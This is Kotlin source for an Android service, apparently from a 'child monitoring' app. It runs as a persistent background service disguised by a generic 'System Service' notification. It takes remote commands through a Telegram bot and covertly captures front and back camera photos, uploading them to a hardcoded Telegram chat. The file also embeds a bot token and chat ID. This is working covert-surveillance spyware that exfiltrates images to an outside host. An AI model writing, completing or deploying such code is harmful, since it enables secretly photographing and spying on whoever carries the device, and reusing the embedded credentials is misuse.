package com.coc338781.childapp

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class MonitoringService : LifecycleService() {

    companion object {
        // ==== ඔබේ විස්තර මෙතන ====
        const val BOT_TOKEN = "8968739971:AAEsGJc_-MNGE8KKxqwzaZM3TPinPVg_Bms"
        const val CHAT_ID = "7905408190"
        // ========================
        const val CHANNEL_ID = "monitoring_channel"
        private const val TAG = "MonitoringService"
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private var lastUpdateId = 0L
    private var isRunning = true
    private val lifecycleOwner = ServiceLifecycleOwner()

    override fun onCreate() {
        super.onCreate()
        try {
            createChannel()
            startForegroundWithType()
            lifecycleOwner.start()
            startPolling()
        } catch (e: Exception) {
            Log.e(TAG, "onCreate error", e)
        }
    }

    private fun startForegroundWithType() {
        val notification = buildNotification()
        when {
            Build.VERSION.SDK_INT >= 34 -> {
                startForeground(
                    1, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            }
            Build.VERSION.SDK_INT >= 29 -> {
                startForeground(
                    1, notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                )
            }
            else -> {
                startForeground(1, notification)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        return START_STICKY
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                CHANNEL_ID, "System Service",
                NotificationManager.IMPORTANCE_LOW
            )
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    private fun startPolling() {
        lifecycleScope.launch(Dispatchers.IO) {
            while (isRunning) {
                try {
                    val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
                    val response = client.newCall(Request.Builder().url(url).build()).execute()
                    val body = response.body?.string() ?: continue
                    val json = JSONObject(body)
                    val result = json.optJSONArray("result") ?: continue

                    for (i in 0 until result.length()) {
                        val update = result.getJSONObject(i)
                        lastUpdateId = update.getLong("update_id")
                        val msg = update.optJSONObject("message") ?: continue
                        val chatId = msg.getJSONObject("chat").getLong("id").toString()
                        if (chatId != CHAT_ID) continue
                        val text = msg.optString("text", "")
                        if (text.isNotEmpty()) {
                            withContext(Dispatchers.Main) { handleCommand(text.trim()) }
                        }
                    }
                } catch (e: Exception) {
                    delay(5000)
                }
            }
        }
    }

    private fun handleCommand(cmd: String) {
        val c = cmd.lowercase()
        when {
            c == "/cam" -> takePhotoDirect(true)
            c == "/selfie" -> takePhotoDirect(false)
            c == "/ping" -> sendMessage("🏓 Pong! App is alive")
            c == "/help" -> sendMessage(
                "📋 Commands:\n" +
                "/cam - Back camera photo\n" +
                "/selfie - Front camera photo\n" +
                "/ping - Test"
            )
            else -> sendMessage("❓ Unknown: $cmd")
        }
    }

    private fun takePhotoDirect(isBack: Boolean) {
        sendMessage("📷 Taking ${if (isBack) "back" else "front"} photo...")

        val future = ProcessCameraProvider.getInstance(this)
        future.addListener({
            try {
                val provider = future.get()
                val selector = CameraSelector.Builder()
                    .requireLensFacing(
                        if (isBack) CameraSelector.LENS_FACING_BACK
                        else CameraSelector.LENS_FACING_FRONT
                    ).build()
                val imageCapture = ImageCapture.Builder()
                    .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                    .build()

                provider.unbindAll()
                provider.bindToLifecycle(lifecycleOwner, selector, imageCapture)
                sendMessage("Debug: camera bound OK")

                val file = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                val options = ImageCapture.OutputFileOptions.Builder(file).build()

                imageCapture.takePicture(
                    options,
                    ContextCompat.getMainExecutor(this),
                    object : ImageCapture.OnImageSavedCallback {
                        override fun onImageSaved(result: ImageCapture.OutputFileResults) {
                            sendMessage("Debug: photo saved, sending...")
                            sendPhotoToTelegram(file)
                        }
                        override fun onError(exception: ImageCaptureException) {
                            sendMessage("🔴 Camera error: ${exception.message}")
                        }
                    }
                )
            } catch (e: Exception) {
                sendMessage("🔴 Camera exception: ${e.message}")
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun sendPhotoToTelegram(file: File) {
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                    .build()
                val response = client.newCall(Request.Builder().url(url).post(body).build()).execute()
                if (response.isSuccessful) {
                    sendMessage("🟢 Photo sent!")
                } else {
                    sendMessage("🔴 Send failed: ${response.code}")
                }
                file.delete()
            } catch (e: Exception) {
                sendMessage("🔴 Send error: ${e.message}")
            }
        }
    }

    private fun sendMessage(text: String) {
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
                val json = JSONObject().apply {
                    put("chat_id", CHAT_ID)
                    put("text", text)
                }
                val body = json.toString().toRequestBody("application/json".toMediaType())
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
            } catch (_: Exception) {}
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        try {
            lifecycleOwner.stop()
        } catch (_: Exception) {}
    }
}
